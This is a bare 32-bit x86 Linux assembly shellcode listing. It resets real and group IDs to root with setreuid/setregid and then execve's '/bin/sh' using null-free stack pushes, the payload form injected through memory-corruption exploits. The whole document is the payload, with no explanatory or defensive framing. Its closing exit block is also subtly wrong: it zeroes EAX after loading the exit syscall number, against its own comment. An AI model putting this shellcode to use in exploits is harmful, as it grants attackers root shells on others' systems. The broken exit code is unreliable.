global _start

section .text

_start:

; setreuid(0,0)
xor eax,eax ; Zeroes EAX
mov al,0xcb ; EAX = 0xcb = SysCall(setreuid)
xor ebx,ebx ; Zeroes EBX
xor ecx,ecx ; Zeroes ECX
int 0x80    ; Calls kernel

; setregid(0,0)
xor eax,eax ; Zeroes EAX
mov al,0xcc ; EAX = 0xcc = SysCall(setregid)
xor ebx,ebx ; Zeroes EBX
xor ecx,ecx ; Zeroes ECX
int 0x80    ; Calls kernel

; execve("/bin/sh",0,0)
xor eax,eax ; Zeroes EAX
push eax    ; Push NULL terminator into stack
push 0x68732f2f ; Push //sh into stack
push 0x6e69622f ; Push /bin into stack
mov ebx,esp ; Moves "/bin/sh" from stack to EBX 
mov al,0xb  ; EAX = 0xb = SysCall(execve)
xor ecx,ecx ; ECX = argv = NULL
xor edx,edx ; EDX = envp = NULL
int 0x80    ; Calls kernel

; exit(0) 
mov al, 0x1  ; EAX = 0x1 = SysCall(exit)  
xor eax, eax ; EBX = exit number 
int 0x80     ; Calls kernel
